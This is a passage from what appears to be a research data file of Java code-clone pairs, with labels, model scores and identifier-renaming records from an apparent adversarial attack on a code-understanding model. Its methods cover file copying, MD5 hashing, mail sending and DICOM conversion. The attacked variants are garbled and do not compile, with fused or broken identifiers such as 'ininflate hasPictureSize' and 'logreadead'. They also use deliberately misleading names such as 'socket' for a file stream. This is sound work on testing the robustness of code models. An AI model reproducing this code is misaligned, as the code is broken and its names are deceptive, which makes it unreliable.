            } else {
                email.setMsg(body);
            }
            email.setMailSession(session);
            email.buildMimeMessage();
            MimeMessage mime = email.getMimeMessage();
            int size = MessageUtilities.getMessageSize(mime);
            if (!controlQuota(hsession, user, size)) {
                throw new MailException(""ErrorMessages.mail.quota.exceded"");
            }
            messageable.saveSentMessage(mid, mime, user);
            Thread thread = new Thread(new SendMessageThread(email));
            thread.start();
        } catch (MailException e) {
            throw e;
        } catch (Exception e) {
            throw new MailException(e);
        } catch (java.lang.OutOfMemoryError ex) {
            System.gc();
            throw new MailException(ex);
        } catch (Throwable e) {
            throw new MailException(e);
        } finally {
            GeneralOperations.closeHibernateSession(hsession);
        }
    }
 <SPLIT>     public static byte[] fetchURLData(String url, String proxyHost, int proxyPort) throws IOException {
        HttpURLConnection con = null;
        InputStream is = null;
        try {
            URL u = new URL(url);
            if (url.startsWith(""file://"")) {
                is = new BufferedInputStream(u.openStream());
            } else {
                Proxy proxy;
                if (proxyHost != null) {
                    proxy = new Proxy(Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));
                } else {
                    proxy = Proxy.NO_PROXY;
                }
                con = (HttpURLConnection) u.openConnection(proxy);
                con.addRequestProperty(""User-Agent"", ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"");
                con.addRequestProperty(""Accept-Charset"", ""UTF-8"");
                con.addRequestProperty(""Accept-Language"", ""en-US,en"");
                con.addRequestProperty(""Accept"", ""text/html,image/*"");
                con.setDoInput(true);
                con.setDoOutput(false);
                con.connect();
                is = new BufferedInputStream(con.getInputStream());
            }
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            IOUtils.copy(is, baos);
            return baos.toByteArray();
        } finally {
            IOUtils.closeQuietly(is);
            if (con != null) {
                con.disconnect();
            }
        }
    }
",1214,,LABEL_1,LABEL_0,,-4,"send,hsession,session,repositoryName,ideIdint,to,cc,bcc,subject,body,attachments,isHtml,charset,headers,priority,email,user,identity,_returnPath,_from,_replyTo,_to,_cc,_bcc",,,,0,,0,Greedy,1,0.0012158473332722981,,[]
49,"    public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
 <SPLIT>     void copyFile(File src, File dst) throws IOException {
        FileChannel inChannel = new FileInputStream(src).getChannel();
        FileChannel outChannel = new FileOutputStream(dst).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(), outChannel);
        } finally {
            if (inChannel != null) inChannel.close();
            if (outChannel != null) outChannel.close();
        }
    }
",765,"    public void convert(File url, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(url));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""
"" + url + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""
"" + url + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPictureSize = p.getReadTag() == Tags.PixelData;
            boolean ininflate hasPictureSize && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPictureSize) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""
"" + url + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPictureSize) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",LABEL_1,LABEL_1,0.6965311169624329,1,"convert,src,dest,in,p,ds,format,hasPixelData,inflate,pxlen,out",,,,83,"convert:convert,src:url,dest:dest,in:in,p:p,ds:ds,format:format,hasPixelData:hasPictureSize,inflate:inflate,pxlen:pxlen,out:out,",9,GA,583,0.2369035601615906,ga,[]
50,"    public static boolean encodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.ENCODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     private static long copy(InputStream source, OutputStream sink) {
        try {
            return IOUtils.copyLarge(source, sink);
        } catch (IOException e) {
            logger.error(e.toString(), e);
            throw new FaultException(""System error copying stream"", e);
        } finally {
            IOUtils.closeQuietly(source);
            IOUtils.closeQuietly(sink);
        }
    }
",194,"    public static boolean encodeFileToFile(String infile, String outname) {
        boolean cess = false;
        java.io.InputStream login = null;
        java.io.OutputStream socket = null;
        try {
            login = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.ENCODE);
            socket = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outname));
            byte[] url = new byte[65536];
            int read = -1;
            while ((read = logreadead(url)) >= 0) {
                socket.write(url, 0, read);
            }
            cess = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                login.close();
            } catch (Exception exc) {
            }
            try {
                socket.close();
            } catch (Exception exc) {
            }
        }
        return cess;
    }
",LABEL_1,LABEL_1,0.8803523182868958,1,"encodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,7,"encodeFileToFile:encodeFileToFile,infile:infile,outfile:outname,in:login,out:socket,buffer:url,read:read,success:cess,",3,GA,398,0.14387449423472087,ga,[]
51,"    public void process(@NotNull Template tpl, @NotNull Document model, @NotNull String packageName, @NotNull String outFileName, Map<String, String> xsltParam, String artifact) throws ModelGenerationException {
        System.out.print(""Processing with "" + tpl);
        String destinationPath;
        switch(tpl.destination) {
            case target:
                if (tpl.path == null) {
                    destinationPath = where.buildDir + separatorChar + ""generated-sources"" + separatorChar + GENERATION_TARGET;
                } else {
                    destinationPath = where.buildDir;
                }
                break;
            case source:
                if (tpl.path == null) {
                    destinationPath = where.sourceDir;
                } else {
                    destinationPath = ""src"";
                }
                break;
            case redora:
                destinationPath = where.redoraDir;
                break;
            default:
                throw new IllegalArgumentException(""Unused destination "" + tpl.destination);
        }
        if (tpl.path == null) {
            if (tpl.destination == Destination.redora) destinationPath += separator + artifact; else destinationPath += separator + packageName.replace('.', separatorChar);
        } else {
            destinationPath += separator + tpl.path.replace('/', separatorChar).replace('\\', separatorChar);
        }
        System.out.println("" to "" + destinationPath + ""..."" + outFileName);
        if (tpl.destination == Destination.source) {
            if (new File(destinationPath, outFileName).exists()) {
                System.out.println(""Stub "" + outFileName + "" already exists."");
                return;
            }
        }
        new File(destinationPath).mkdirs();
        InputStream in = null;
        Writer out;
        try {
            out = new FileWriter(new File(destinationPath, outFileName));
        } catch (IOException e) {
            throw new ModelGenerationException(""Can't find: "" + destinationPath + separatorChar + outFileName, e);
        }
        switch(tpl.type) {
            case freemarker:
                Map<String, NodeModel> root = new HashMap<String, NodeModel>();
                root.put(""doc"", NodeModel.wrap(model));
                try {
                    freemarker.template.Template template = freemarkerConf.getTemplate(tpl.getTemplateFileName());
                    template.process(root, out);
                } catch (ParseException e) {
                    throw new ModelGenerationException(""There is an error in template: "" + tpl + "". I found it when generating "" + outFileName, e);
                } catch (IOException e) {
                    throw new ModelGenerationException(""Can't find '"" + tpl + ""' when generating "" + outFileName, e);
                } catch (TemplateException e) {
                    throw new ModelGenerationException(""There is an error in template: "" + tpl + "". I found it when generating "" + outFileName, e);
                } catch (RuntimeException e) {
                    throw new ModelGenerationException(""There is another error while trying this template: "" + tpl + "". I found it when generating "" + outFileName, e);
                }
                break;
            case xslt:
                try {
                    in = new FileInputStream(tpl.getAbsolutePath());
                    xsltTransform(model.getFirstChild(), in, out, xsltParam);
                } catch (FileNotFoundException e) {
                    throw new ModelGenerationException(""Can't find "" + tpl, e);
                } catch (TransformerException e) {
                    throw new ModelGenerationException(""Sorry, i failed to use this template: "" + tpl + "". It broke when generating "" + outFileName, e);
                } finally {
                    IOUtils.closeQuietly(in);
                }
                break;
            case copy:
                try {
                    in = new FileInputStream(tpl.getAbsolutePath());
                    IOUtils.copy(in, out);
                } catch (IOException e) {
                    throw new ModelGenerationException(""File copy failed "" + tpl.getTemplateFileName(), e);
                } finally {
                    IOUtils.closeQuietly(in);
                }
        }
        IOUtils.closeQuietly(out);
    }
 <SPLIT>     public void doBody(JWebLiteRequestWrapper req, JWebLiteResponseWrapper resp) throws SkipException {
        BufferedInputStream bis = null;
        BufferedOutputStream bos = null;
        try {
            bis = new BufferedInputStream(new FileInputStream(this.loadData(req)));
            bos = new BufferedOutputStream(resp.getOutputStream());
            IOUtils.copy(bis, bos);
            bos.flush();
        } catch (Exception e) {
            _cat.warn(""Write data failed!"", e);
        } finally {
            IOUtils.closeQuietly(bis);
            IOUtils.closeQuietly(bos);
        }
    }
",690,,LABEL_1,LABEL_1,LABEL_1,-1,"process,tpl,model,packageName,outFileName,xsltParam,artifact,destinationPath,in,out,root",,,,0,,0,GA,4046,1.6438724398612976,failed,[]
52,"    private String encode(String str) {
        StringBuffer buf = new StringBuffer();
        try {
            MessageDigest md5 = MessageDigest.getInstance(""MD5"");
            md5.update(str.getBytes());
            byte bytes[] = md5.digest();
            for (int i = 0; i < bytes.length; i++) {
                String s = Integer.toHexString(bytes[i] & 0xff);
                if (s.length() == 1) {
                    buf.append(""0"");
                }
                buf.append(s);
            }
        } catch (Exception ex) {
        }
        return buf.toString();
    }
 <SPLIT>     private String md5(String uri) throws ConnoteaRuntimeException {
        try {
            MessageDigest messageDigest = MessageDigest.getInstance(""MD5"");
            messageDigest.update(uri.getBytes());
            byte[] bytes = messageDigest.digest();
            StringBuffer stringBuffer = new StringBuffer();
            for (byte b : bytes) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) {
                    stringBuffer.append('0');
                }
                stringBuffer.append(hex);
            }
            return stringBuffer.toString();
        } catch (NoSuchAlgorithmException e) {
            throw new ConnoteaRuntimeException(e);
        }
    }
",130,,LABEL_1,LABEL_1,LABEL_1,-1,"encode,str,buf,md5,bytes,i,s",,,,0,,0,GA,2286,0.8172157724698385,failed,[]
53,"    public static String encrypt(String text) throws NoSuchAlgorithmException {
        MessageDigest md;
        md = MessageDigest.getInstance(""MD5"");
        byte[] md5hash = new byte[32];
        try {
            md.update(text.getBytes(""iso-8859-1""), 0, text.length());
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        md5hash = md.digest();
        return convertToHex(md5hash);
    }
 <SPLIT>     public void descargarArchivo() {
        try {
            FileInputStream fis = new FileInputStream(resultados.elementAt(materialSelccionado).getRuta());
            FileOutputStream fos = new FileOutputStream(rutaDestinoDescarga);
            FileChannel inChannel = fis.getChannel();
            FileChannel outChannel = fos.getChannel();
            inChannel.transferTo(0, inChannel.size(), outChannel);
            fis.close();
            fos.close();
        } catch (IOException ioe) {
            System.err.println(""Error al Generar Copia del Material\n"" + ioe);
        }
    }
",91,,LABEL_0,LABEL_0,LABEL_0,-1,"encrypt,text,md,md5hash",,,,0,,0,GA,1050,0.3771760622660319,failed,[]
54,"    public static void copy(File from, File to) {
        boolean result;
        if (from.isDirectory()) {
            File[] subFiles = from.listFiles();
            for (int i = 0; i < subFiles.length; i++) {
                File newDir = new File(to, subFiles[i].getName());
                result = false;
                if (subFiles[i].isDirectory()) {
                    if (newDir.exists()) result = true; else result = newDir.mkdirs();
                } else if (subFiles[i].isFile()) {
                    try {
                        result = newDir.createNewFile();
                    } catch (IOException e) {
                        log.error(""unable to create new file: "" + newDir, e);
                        result = false;
                    }
                }
                if (result) copy(subFiles[i], newDir);
            }
        } else if (from.isFile()) {
            FileInputStream in = null;
            FileOutputStream out = null;
            try {
                in = new FileInputStream(from);
                out = new FileOutputStream(to);
                int fileLength = (int) from.length();
                char charBuff[] = new char[fileLength];
                int len;
                int oneChar;
                while ((oneChar = in.read()) != -1) {
                    out.write(oneChar);
                }
            } catch (FileNotFoundException e) {
                log.error(""File not found!"", e);
            } catch (IOException e) {
                log.error(""Unable to read from file!"", e);
            } finally {
                try {
                    if (in != null) in.close();
                    if (out != null) out.close();
                } catch (IOException e1) {
                    log.error(""Error closing file reader/writer"", e1);
                }
            }
        }
    }
 <SPLIT>     void copyFile(File src, File dst) throws IOException {
        FileChannel inChannel = new FileInputStream(src).getChannel();
        FileChannel outChannel = new FileOutputStream(dst).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(), outChannel);
        } finally {
            if (inChannel != null) inChannel.close();
            if (outChannel != null) outChannel.close();
        }
    }
",352,"    public static void ignore(File url, File as) {
        boolean mask;
        if (url.isDirectory()) {
            File[]ubPagess = url.listFiles();
            for (intii = 0;ii < ubPages.length; i++) {
                FilenextDirectoryr = new File(as, ubPages[i].getName());
                mask = false;
                if (ubPages[i].isDirectory()) {
                    nextDirectorywDir.exists()) mask = true; else mask = nextDirectory.mkdirs();
                } else if (ubPages[i].isFile()) {
                    try {
                        mask = nextDirectory.createNewFile();
                    } catch (IOException e) {
                        log.error(""unable to create new file: "" + nextDirectory, e);
                        mask = false;
                    }
                }
                if (remaskignore(ubPages[i], nextDirectory);
            }
        } else if (url.isFile()) {
            FileInputStream in = null;
            FileOutputStream file = null;
            try {
               inn = new FileInputStream(url);
                file = new FileOutputStream(as);
                intfileLengthh = (int) url.length();
                char charBuff[] = new char[fileLength];
                int len;
                int zeroChar;
                while ((zeroChar = in.read()) != -1) {
                    file.write(zeroChar);
                }
            } catch (FileNotFoundException e) {
                log.error(""File not found!"", e);
            } catch (IOException e) {
                log.error(""Unable to read from file!"", e);
            } finally {
                try {
                    if (in != null) in.close();
                    if (file != null) file.close();
                } catch (IOException e1) {
                    log.error(""Error closing file reader/writer"", e1);
                }
            }
        }
    }
",LABEL_1,LABEL_1,0.566213846206665,1,"copy,from,to,result,subFiles,i,newDir,in,out,fileLength,charBuff,len,oneChar",,,,16,"copy:ignore,from:url,to:as,result:mask,subFiles:ubPages,i:i,newDir:nextDirectory,in:in,out:file,fileLength:fileLength,charBuff:charBuff,len:len,oneChar:zeroChar,",5,GA,783,0.2904817461967468,ga,[]
55,"    private String File2String(String directory, String filename) {
        String line;
        InputStream in = null;
        try {
            File f = new File(filename);
            System.out.println(""File On:>>>>>>>>>> "" + f.getCanonicalPath());
            in = new FileInputStream(f);
        } catch (FileNotFoundException ex) {
            in = null;
        } catch (IOException ex) {
            in = null;
        }
        try {
            if (in == null) {
                filename = directory + ""/"" + filename;
                java.net.URL urlFile = ClassLoader.getSystemResource(filename);
                if (urlFile == null) {
                    System.out.println(""Integrated Chips list file not found: "" + filename);
                    System.exit(-1);
                }
                in = urlFile.openStream();
            }
            BufferedReader reader = new BufferedReader(new InputStreamReader(in));
            StringBuffer xmlText = new StringBuffer();
            while ((line = reader.readLine()) != null) {
                xmlText.append(line);
            }
            reader.close();
            return xmlText.toString();
        } catch (FileNotFoundException ex) {
            System.out.println(""Integrated Chips list file not found"");
            System.exit(-1);
        } catch (IOException ex) {
            ex.printStackTrace();
            System.exit(-1);
        }
        return null;
    }
 <SPLIT>     public String getXML(String servletURL, String request) {
        StringBuffer stringBuffer = new StringBuffer();
        try {
            String encodedRequest = URLEncoder.encode(request, ""UTF-8"");
            URL url = new URL(servletURL + request);
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                stringBuffer.append(inputLine);
            }
            in.close();
        } catch (MalformedURLException ex) {
            return null;
        } catch (UnsupportedEncodingException ex) {
            return null;
        } catch (IOException ex) {
            return null;
        }
        return stringBuffer.toString();
    }
",259,"    private String File2String(String Directory, String utf) {
        String rule;
        InputStream in = null;
        try {
            file f = new File(utf);
            System.out.println(""File On:>>>>>>>>>> "" + f.getCanonicalPath());
            in = new FileInputStream(f);
        } catch (FileNotFoundException ex) {
            in = null;
        } catch (IOException ex) {
            in = null;
        }
        try {
            if (in == null) {
                utf = Directory + ""/"" + utf;
                java.net urlfilelFile = ClassLoader.getSystemResource(utf);
                if ( urlfile == null) {
                    System.out.println(""Integrated Chips list file not found: "" + utf);
                    System.exit(-1);
                }
                in =  urlfile.openStream();
            }
            BufferedReader parser = new BufferedReader(new InputStreamReader(in));
            StringBuffer xmlData = new StringBuffer();
            while ((rule = parser.readLine()) != null) {
                xmlData.append(rule);
            }
            parser.close();
            return xmlData.toString();
        } catch (FileNotFoundException ex) {
            System.out.println(""Integrated Chips list file not found"");
            System.exit(-1);
        } catch (IOException ex) {
            ex.printStackTrace();
            System.exit(-1);
        }
        return null;
    }
",LABEL_1,LABEL_1,0.5076727867126465,1,"File2String,directory,filename,line,in,f,urlFile,reader,xmlText",,,,11,"File2String:File2String,directory:Directory,filename:utf,line:rule,in:in,f:f,urlFile: urlfile,reader:parser,xmlText:xmlData,",3,GA,577,0.21243502298990885,ga,[]
56,"    protected void truncate(final File file) {
        LogLog.debug(""Compression of file: "" + file.getAbsolutePath() + "" started."");
        if (FileUtils.isFileOlder(file, ManagementFactory.getRuntimeMXBean().getStartTime())) {
            final File backupRoot = new File(this.getBackupDir());
            if (!backupRoot.exists() && !backupRoot.mkdirs()) {
                throw new AppenderInitializationError(""Can't create backup dir for backup storage"");
            }
            SimpleDateFormat df;
            try {
                df = new SimpleDateFormat(this.getBackupDateFormat());
            } catch (final Exception e) {
                throw new AppenderInitializationError(""Invalid date formate for backup files: "" + this.getBackupDateFormat(), e);
            }
            final String date = df.format(new Date(file.lastModified()));
            final File zipFile = new File(backupRoot, file.getName() + ""."" + date + "".zip"");
            ZipOutputStream zos = null;
            FileInputStream fis = null;
            try {
                zos = new ZipOutputStream(new FileOutputStream(zipFile));
                final ZipEntry entry = new ZipEntry(file.getName());
                entry.setMethod(ZipEntry.DEFLATED);
                entry.setCrc(FileUtils.checksumCRC32(file));
                zos.putNextEntry(entry);
                fis = FileUtils.openInputStream(file);
                final byte[] buffer = new byte[1024];
                int readed;
                while ((readed = fis.read(buffer)) != -1) {
                    zos.write(buffer, 0, readed);
                }
            } catch (final Exception e) {
                throw new AppenderInitializationError(""Can't create zip file"", e);
            } finally {
                if (zos != null) {
                    try {
                        zos.close();
                    } catch (final IOException e) {
                        LogLog.warn(""Can't close zip file"", e);
                    }
                }
                if (fis != null) {
                    try {
                        fis.close();
                    } catch (final IOException e) {
                        LogLog.warn(""Can't close zipped file"", e);
                    }
                }
            }
            if (!file.delete()) {
                throw new AppenderInitializationError(""Can't delete old log file "" + file.getAbsolutePath());
            }
        }
    }
 <SPLIT>     public boolean clonarFichero(FileInputStream rutaFicheroOrigen, String rutaFicheroDestino) {
        System.out.println("""");
        boolean estado = false;
        try {
            FileOutputStream salida = new FileOutputStream(rutaFicheroDestino);
            FileChannel canalOrigen = rutaFicheroOrigen.getChannel();
            FileChannel canalDestino = salida.getChannel();
            canalOrigen.transferTo(0, canalOrigen.size(), canalDestino);
            rutaFicheroOrigen.close();
            salida.close();
            estado = true;
        } catch (IOException e) {
            System.out.println(""No se encontro el archivo"");
            e.printStackTrace();
            estado = false;
        }
        return estado;
    }
",420,"    protected void truncational(final File url) {
        LogLog.debug(""Compression of file: "" + url.getAbsolutePath() + "" started."");
        if (FileUtils.isFileOlder(url, ManagementFactory.getRuntimeMXBean().getStartTime())) {
            final File BackupDir = new File(this.getBackupDir());
            if (!BackupDir.exists() && !BackupDir.mkdirs()) {
                throw new AppenderInitializationError(""Can't create backup dir for backup storage"");
            }
            SimpleDateFormat df;
            try {
                df = new SimpleDateFormat(this.getBackupDateFormat());
            } catch (final Exception e) {
                throw new AppenderInitializationError(""Invalid date formate for backup files: "" + this.getBackupDateFormat(), e);
            }
            final Stringdatee =dff.format(new Date(url.lastModified()));
            final FilzipEntryle = new FileBackupDirt, url.getName() + ""."" + date + "".zip"");
            ZipOutputStream zos = null;
            FileInputStream fis = null;
            try {
                zzos= new ZipOutputStream(new FileOutputStream(zipEntry));
                final ZipEntryreadery = new ZipEntry(url.getName());
                reader.setMethod(ZipEntry.DEFLATED);
               readery.setCrc(FileUtils.checksumCRC32(url));
                zos.putNextEntry(reader);
               fiss = FileUtils.openInputStream(url);
                final byte[] buffer = new byte[1024];
                int readed;
                while ((readed = fis.read(buffer)) != -1) {
                    zos.write(buffer, 0, readed);
                }
            } catch (final Exception e) {
                throw new AppenderInitializationError(""Can't create zip file"", e);
            } finally {
                if (zos != null) {
                    try {
                        zos.close();
                    } catch (final IOException e) {
                        LogLog.warn(""Can't close zip file"", e);
                    }
                }
                if (fis != null) {
                    try {
                        fis.close();
                    } catch (final IOException e) {
                        LogLog.warn(""Can't close zipped file"", e);
                    }
                }
            }
            if (!url.delete()) {
                throw new AppenderInitializationError(""Can't delete old log file "" + url.getAbsolutePath());
            }
        }
    }
",LABEL_1,LABEL_1,0.5140672922134399,1,"truncate,file,backupRoot,df,date,zipFile,zos,fis,entry,buffer,readed",,,,23,"truncate:truncational,file:url,backupRoot:BackupDir,df:df,date:date,zipFile:zipEntry,zos:zos,fis:fis,entry:reader,buffer:buffer,readed:readed,",6,GA,651,0.24753100872039796,ga,[]
57,"    public static void saveAttachmentBody(Context context, Part part, Attachment localAttachment, long accountId) throws MessagingException, IOException {
        if (part.getBody() != null) {
            long attachmentId = localAttachment.mId;
            InputStream in = part.getBody().getInputStream();
            File saveIn = AttachmentProvider.getAttachmentDirectory(context, accountId);
            if (!saveIn.exists()) {
                saveIn.mkdirs();
            }
            File saveAs = AttachmentProvider.getAttachmentFilename(context, accountId, attachmentId);
            saveAs.createNewFile();
            FileOutputStream out = new FileOutputStream(saveAs);
            long copySize = IOUtils.copy(in, out);
            in.close();
            out.close();
            String contentUriString = AttachmentProvider.getAttachmentUri(accountId, attachmentId).toString();
            localAttachment.mSize = copySize;
            localAttachment.mContentUri = contentUriString;
            ContentValues cv = new ContentValues();
            cv.put(AttachmentColumns.SIZE, copySize);
            cv.put(AttachmentColumns.CONTENT_URI, contentUriString);
            Uri uri = ContentUris.withAppendedId(Attachment.CONTENT_URI, attachmentId);
            context.getContentResolver().update(uri, cv, null, null);
        }
    }
 <SPLIT>     private void download(String fileName) {
        String filePath = Activator.showSaveDialog(fileName, new String[] { "".xls"" });
        if (filePath != null) {
            InputStream in = null;
            OutputStream out = null;
            try {
                in = this.getClass().getResourceAsStream(""/"" + fileName);
                out = new FileOutputStream(filePath);
                IOUtils.copy(in, out);
            } catch (IOException ioe) {
                Activator.showExceptionDialog(ioe);
            } finally {
                if (in != null) {
                    try {
                        in.close();
                    } catch (IOException e1) {
                        Activator.showExceptionDialog(e1);
                    }
                }
                if (out != null) {
                    try {
                        out.close();
                    } catch (IOException e1) {
                        Activator.showExceptionDialog(e1);
                    }
                }
            }
        }
    }
",227,"    public static void saveAttPartbody(Context context, Part section, Attachment localattention, long accID) throws MessagingException, IOException {
        if (section.getBody() != null) {
            longattagramIndexd = localattention.mId;
            InputStream in urlsection.getBody().getInputStream();
            FsaveInveIn = AttachmentProvider.getAttachmentDirectory(context, accID);
            if (!saveIn.exists()) {
                saveIn.mkdirs();
            }
            FiopenASeAs = AttachmentProvider.getAttachmentFilename(context, accID, attagramIndex);
            openAS.createNewFile();
            FileOutputStream client = new FileOutputStream(openAS);
            long copycopySizeOUtils.copy(url, client);
            url.close();
            client.close();
            StricontentUiStringing = AttachmentProvider.getAttachmentUri(accID, attagramIndex).toString();
            localattention.mSize = copySize;
            localattentionmResourceIrici = contentUiString;
            ContentValues cv = new ContentValues();
            cv.put(AttachmentColumns.SIZE, copySize);
           cvv.put(AttachmentColumns.CONTENT_URI, contentUiString);
            Uri uuri= ContentUris.withAppendedId(Attachment.CONTENT_URI, attagramIndex);
            context.getContentResolver().update(uri, cv, null, null);
        }
    }
",LABEL_1,LABEL_1,0.5513937473297119,1,"saveAttachmentBody,context,part,localAttachment,accountId,attachmentId,in,saveIn,saveAs,out,copySize,contentUriString,mSize,mContentUri,cv,uri",,,,17,"saveAttachmentBody:saveAttPartbody,context:context,part:section,localAttachment:localattention,accountId:accID,attachmentId:attagramIndex,in:url,saveIn:saveIn,saveAs:openAS,out:client,copySize:copySize,contentUriString:contentUiString,mSize:mSize,mContentUri:mResourceIric,cv:cv,uri:uri,",6,GA,942,0.3464024305343628,ga,[]
58,"    public static String getFile(String serviceName, String wsdlLocation, String endpoint) throws AxisFault {
        mLog.debug(""Downloading WSDL file from: "" + wsdlLocation);
        mLog.debug(""Received endpoint: "" + endpoint);
        String fileLocation = null;
        try {
            String tempDir = System.getProperty(""java.io.tmpdir"");
            URL url = new URL(wsdlLocation);
